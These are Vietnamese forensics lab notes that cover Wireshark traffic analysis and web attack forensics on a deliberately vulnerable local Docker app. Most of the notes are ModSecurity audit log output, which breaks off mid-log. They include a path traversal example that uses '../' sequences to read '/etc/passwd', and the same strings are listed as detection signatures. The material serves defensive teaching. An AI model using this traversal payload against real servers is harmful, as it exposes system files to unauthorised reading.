    - Click vào icon vây cá mập xanh dương ở góc trái trên để bắt đầu thu thập.
    - Trong đa số các trường hợp, nên nhìn các packets bắt đầu xuất hiện trên Wireshark. Nếu không, có thể thử tạo một số lưu lượng bằng cách mở một website như Google.
    ![image](https://hackmd.io/_uploads/rJSIa4TNZe.png)
    - Để dừng việc thu thập, click nút stop ở góc trái trên màu đỏ.
    - Để lưu lưu lượng, `File` $\rightarrow$ `Save as` và chọn tên và vị trí để lưu file lưu lượng.
> Mặc định, file extension nên là `.pcapng`. Một extension khác phổ biến là `pcap`.

#### 2. Phân tích Network Traffic
- Bước tiếp theo trong forensics lưu lượng mạng là phân tích lưu lượng, nghĩa là kiểm tra để nhận diện các hoạt động độc hại, các nỗ lực truy cập trái phép và xuất các thông tin như:
    - Source, địa chỉ IP đích và cổng.
    - Giao thức.
    - Sự truyền data/payload.
    - Thời gian của hoạt động.
- Trong khi có các features available trong Wireshark cho network forensics, có một số thông dụng được dùng để hiển thị cấp bậc giao thức, applying filters, hiển thị packet details và packet bytes, theo dõi TCP streams và xuất các objects.
- Để bắt đầu phân tích mẫu lưu lượng mạng, download file ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2005/files/capture.pcapng) và mở nó bằng Wireshark.

![image](https://hackmd.io/_uploads/B1FQ1r6NZl.png)

##### a) Protocol Hierarchy
Để có một cái nhìn tổng quan về các lưu lượng thu thập được, `Statistics` $\rightarrow$ `Protocol Hierarchy` để xem protocols nào đang được dùng trong lưu lượng và sự liên quan của các packets cho mỗi protocol. Điều này giúp thu hẹp việc phân tích và lọc cho lưu lượng độc hại.

![image](https://hackmd.io/_uploads/SJmr1Sa4Zx.png)

##### b) Filters
- Ta có thể apply filters để tập trung vào lưu lượng tuỳ ý, điều này giúp dễ dàng hơn trong việc phân tích và hiển thị duy nhất packets có liên quan mà ta cần.
- Ảnh sau giải thích cách lọc HTTP packets:

![image](https://hackmd.io/_uploads/rJrRkrpE-e.png)
- Tương tự, có thể lọc FTP packets:

![image](https://hackmd.io/_uploads/Byz5xHT4Zl.png)
- Tham khảo [DisplayFilters](https://wiki.wireshark.org/DisplayFilters) để xem bộ lọc khác mà Wireshark hỗ trợ .-.

##### c) Packet Details và Packet Bytes
Ô packet chi tiết hiển thị packet được chọn theo cách form chi tiết, trong khi ô packet bytes hiển thị dữ liệu của packet được chọn trong hexdump format.

![image](https://hackmd.io/_uploads/B1FQ1r6NZl.png)

##### d) Follow TCP Stream
Follow TCP Stream feature trong Wireshark hiển thị toàn bộ cuộc hội thoại (conversation) cho một kết nối TCP cụ thể. Điều này giúp dễ dàng hơn để quan sát đầy đủ chi tiết của một kết nối và bất kỳ data được truyền trong kết nối này. Để dùng feature này, click chuột phải vào bất kỳ packet nào và chọn `Follow` $\rightarrow$ `TCP Stream`:

![image](https://hackmd.io/_uploads/SkNqzrpE-e.png)

##### e) Export Objects
- Export Objects feature cho phép extract file từ lưu lượng mạng đã thu thập. Để truy cập feature này, chọn `File` $\rightarrow$ `Export Objects`.
- Trong `HTTP` sub-menu, ta có thể hiển thị danh sách các files đã chuyển giao HTTP trong lúc thu thập. Sau khi chọn file(s) muốn extract, có thể lưu nó bằng cách click `Save`.

![image](https://hackmd.io/_uploads/SyGtXSp4Zg.png)

## WEB ATTACK FORENSICS
- Web apps là toàn bộ của cuộc sống thường ngày của chúng ta và được sử dụng trong hầu hết các hoạt động, từ mua sắm online cho đến banking và social media. Tuy nhiên, việc sử dụng rộng rãi mở ra nguy cơ tấn công lớn cho các tác nhân xấu để exploit và chiếm quyền trong hệ thống.
- Dưới đây là một số loại tấn công web apps phổ biến khác nhau và một số kỹ thuật nhận biết các loại tấn công này bằng cách phân tích web app logs và web app firewall logs, để tìm điểm tấn công, và tìm ra vấn đề gốc rễ bằng cách nhận diện lỗ hổng được khai thác.

## I. Set up môi trường:
Trước khi tìm hiẻu các loại tấn công web và forensics thì ta thiết lập môi trường bằng cách dùng Docker, nó sẽ cho phép ta hiểu sâu sắc và toàn diện hơn về nội dung được đề cập.

### Clone the repository:
``` ubuntu
git clone https://github.com/vonderchild/digital-forensics-lab && cd digital-forensics-lab/Lab\ 04/files/app
```

![image](https://hackmd.io/_uploads/HJdzEI9Vbl.png)

### Cài đặt Docker:
``` unbuntu
sudo apt-get update
sudo apt-get install -y docker.io
sudo service docker start
```

### Build & Run Docker Image:
``` ubuntu
docker build -t app:latest .
docker run -p 9090:80 app:latest
```

## II. Web Attacks & Forensics:
### 1. Web Application & WAF Logs:
- Web app logs đóng một vai trò quan trọng trong digital forensics và giúp theo dõi hoạt động của user, dò ra sự tấn công, tìm ra nguồn gốc của một tấn công và xác định quy mô ảnh hưởng của nó. Ở phần này ta sẽ tập trung vào Apache, một web server được sử dụng rộng rãi cho hosting web apps. Access logs chứa thông tin về các incoming request như địa chỉ IP của client, thời gian request, phương pháp request (GET, POST,...), requested URI, response status code (`200`, `403`, `404`,...) và user agent. Mặt khác, error logs chứa thông tin về các lỗi mà server gặp phải như các requests thất bại, events không mong đợi xảy ra trong trong quá trình xử lý request. Các logs này có thể tìm ở `/var/log/apache2` trên hệ thống Linux.
- Web apps firewalls (WAFs) là một khía cạnh quan trọng của việc bảo mật web app. Một WAF cung cấp một lớp bảo mật cho app bằng cách ngăn chặn malicious traffic trước khi nó tới được app. Trong phần này, ta sử dụng Modsecurity như web app firewall. Vị trí mặc định cho audit logs của nó là `/var/log/apache2/modsec_audit.log`. Khi một lỗi hoặc bất kì nỗ lực độc hại nào được bắt gặp trên server, nó sẽ được lưu lại trong `/var/log/apache2/error.log`.
- Cấu trúc thư mục của các logs trên:
```
var
└── log
    └── apache2
        ├── access.log
        ├── error.log
        ├── modsec_audit.log
        └── other_vhosts_access.log
```

### 2. Common Web Attacks & Logs:
- Để thực hiện web attack forensics một cách hiệu quả, ta phải có hiểu biết về các loại web attacks phổ biến. Các attacks này khai thác lỗ hổng trong web apps, biết được cách hoạt động của chúng là rất quan trọng trong việc ghép nối các events gây ra attack.
- Có rất nhiều lỗ hổng có thể khai thác trong một web app, từ lỗ hổng không có ảnh hưởng thực tế cho đến các lỗ hổng gây ra hậu quả lớn cho một tổ chức. Tuy nhiên, trong phần này ta chỉ tập trung vào một số như Path Traversal, Remote Command Execution và SQL Injection.
- Để tham gia vào lab, phần set up môi trường phải truy cập được vào http://127.0.0.1:9090/:

![image](https://hackmd.io/_uploads/SkXWSUq4-l.png)

#### a) Path Traversal:
- Được biết đến là 'directory traversal', lỗ hổng này cho phép attackers truy cập files và thư mục trên server nằm ngoài thư mục gốc. Nó thường được thực hiện bằng cách thao tác với các file path input fields trên một web app để truy cập files mà app cho phép truy cập, nhưng attacker không nên làm vậy. Loại tấn công này đạt được kết quả là các thông tin nhạy cảm như các files cấu hình và source code,... bị leak.
- Ví dụ, cho rằng ta đang ở thư mục `/home/kali/`. Để thay đổi thư mục cha đến `/home`, ta phải gõ `cd ../`. Để tới được thư mục root, ta phải gõ `cd ../../`. Các concept tương tự này được dùng trong một path traversal attack, nơi một website cho phép truy cập đến các files nằm ngoài thư mộc root của website.
> - Thuật ngữ 'Path Traversal' thường được dùng thay cho Local File Inclusion (LFI), tuy nhiên cả hai là những lỗ hổng khác nhau, Path Traversal bị giới hạn việc đọc files trên server, trong khi đó LFI đề cập đến khả năng bổ sung để thực thi files đó trên server.
> - Dấu hiệu thường gặp: `../`, `/etc/passwd`
- Để thử nó, đi đến http://127.0.0.1/images.php và nó sẽ hiển thị một số hình ảnh với một input field:

![image](https://hackmd.io/_uploads/HJhVSLqNZl.png)
- Nếu ta enter đúng image name, web app sẽ hiển thị nó cho ta. Nhưng nếu ta thử enter một file name không phải của một image, ví dụ như `/etc/passwd`, nó sẽ in ra contents của nó. Tuy nhiên, ta chỉ cần add một số leading `../` trước file name `/etc/passwd` của ta:

![image](https://hackmd.io/_uploads/S11wUL54bg.png)
- Ta đã thấy quen với phương pháp khai thác lỗ hổng này nên tiếp theo là cách dò ra nó trong logs. Để truy cập logs, đầu tiên ta phải take shell trong docker container nơi app đang chạy. Ta làm điều đó bằng cách mở một terminal khác rồi liệt kê container ID với `docker ps -q` và thực thi `doker exec` để tạo ra một shell:

![image](https://hackmd.io/_uploads/HyzUyw9NZe.png)
- Ta đã vào được root, giờ sẽ đi đến thư mục chứ access logs và in nó ra:

![image](https://hackmd.io/_uploads/BygDRyv9NZx.png)
Có thể thấy rằng, logs hiển thị các requests tạo bởi server từ địa chỉ IP `172.17.0.1` bằng cách sử dụng trình duyệt Chrome đi đến `/images.php` và `/view.php`. Hai logs áp cuối cho thấy nỗ lực khai thác lỗ hổng path traversal bằng cách truy cập file `/etc/passwd`.
- Đánh giá logs tạo bởi Modsecurity WAF, output có được:
``` ubuntu
root@d3c4a84b597b:/var/log/apache2# cat modsec_audit.log
--c630e167-A--
[06/Jan/2026:14:24:50.739242 +0500] aVzU4pG7zE_Am08YUQTRvgAAAAA 172.17.0.1 43900 172.17.0.2 80
--c630e167-B--
GET / HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 715
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Home</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">Welcome to the Lab</h1>
        <div class="row mt-5">
            <div class="col-md-4">
                <a href="images.php" class="btn btn-primary btn-block">View Images</a>
            </div>
            <div class="col-md-4">
                <a href="command.php" class="btn btn-primary btn-block">Execute Commands</a>
            </div>
            <div class="col-md-4">
                <a href="users.php" class="btn btn-primary btn-block">Get Users</a>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/"] [unique_id "aVzU4pG7zE_Am08YUQTRvgAAAAA"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691490725007 14267 (- - -)
Stopwatch2: 1767691490725007 14267; combined=5463, p1=4079, p2=916, p3=48, p4=251, p5=169, sr=3304, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:24:51.397064 +0500] aVzU45G7zE_Am08YUQTRvwAAAAA 172.17.0.1 43900 172.17.0.2 80
--49e1f51a-B--
GET /favicon.ico HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 404 Not Found
Content-Length: 273
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

--49e1f51a-E--
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 127.0.0.1 Port 9090</address>
</body></html>

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/favicon.ico"] [unique_id "aVzU45G7zE_Am08YUQTRvwAAAAA"]
Stopwatch: 1767691491394132 2956 (- - -)
Stopwatch2: 1767691491394132 2956; combined=1367, p1=366, p2=821, p3=22, p4=95, p5=63, sr=84, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.591138 +0500] aVzVGtaDAgmw-nY6-DiarQAAAAI 172.17.0.1 33226 172.17.0.2 80
--c630e167-B--
GET /images.php HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9090/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 862
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Images</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">View an Image</h1>
        <form action="" class="form-group">
            <div class="input-group mb-3">
                <input type="text" id="file" name="file" class="form-control mt-3" placeholder="Enter file name">
                <div class="input-group-append">
                    <input type="submit" value="Submit" class="btn btn-primary mt-3">
                </div>
            </div>
        </form>
                <div class="row">
            <div class="col-4">
                <img src="images/starry_night.jpg" alt="image1" class="img-fluid rounded">
                <p class="text-center mt-3">starry_night.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/almond_blossom.jpg" alt="image2" class="img-fluid rounded">
                <p class="text-center mt-3">almond_blossom.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/red_vineyards.jpg" alt="image3" class="img-fluid rounded">
                <p class="text-center mt-3">red_vineyards.jpg</p>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzVGtaDAgmw-nY6-DiarQAAAAI"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691546585341 5850 (- - -)
Stopwatch2: 1767691546585341 5850; combined=1974, p1=573, p2=1035, p3=33, p4=247, p5=86, sr=106, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.628374 +0500] aVzVGtfagPkKG1Wgy6n4DQAAAAM 172.17.0.1 33236 172.17.0.2 80
--c630e167-B--
GET /images/almond_blossom.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "276ea-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 161514
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

--c630e167-E--

--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/almond_blossom.jpg"] [unique_id "aVzVGtfagPkKG1Wgy6n4DQAAAAM"]
Stopwatch: 1767691546624102 4324 (- - -)
Stopwatch2: 1767691546624102 4324; combined=1720, p1=601, p2=860, p3=32, p4=106, p5=120, sr=77, sw=1, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:25:46.629016 +0500] aVzVGtaDAgmw-nY6-DiargAAAAI 172.17.0.1 33226 172.17.0.2 80
--49e1f51a-B--
GET /images/starry_night.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "95cbb-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 613563
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/jpeg

--49e1f51a-E--

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/starry_night.jpg"] [unique_id "aVzVGtaDAgmw-nY6-DiargAAAAI"]
Stopwatch: 1767691546623369 5683 (- - -)
Stopwatch2: 1767691546623369 5683; combined=1554, p1=504, p2=828, p3=28, p4=80, p5=114, sr=78, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--

--c630e167-A--
[06/Jan/2026:14:25:46.634720 +0500] aVzVGive669-ZtWihkUyOgAAAAQ 172.17.0.1 33240 172.17.0.2 80
--c630e167-B--
GET /images/red_vineyards.jpg HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 200 OK
Last-Modified: Tue, 06 Jan 2026 09:17:32 GMT
ETag: "c2849-647b4a53a2300"
Accept-Ranges: bytes
Content-Length: 796745
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: image/jpeg

--c630e167-E--

--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
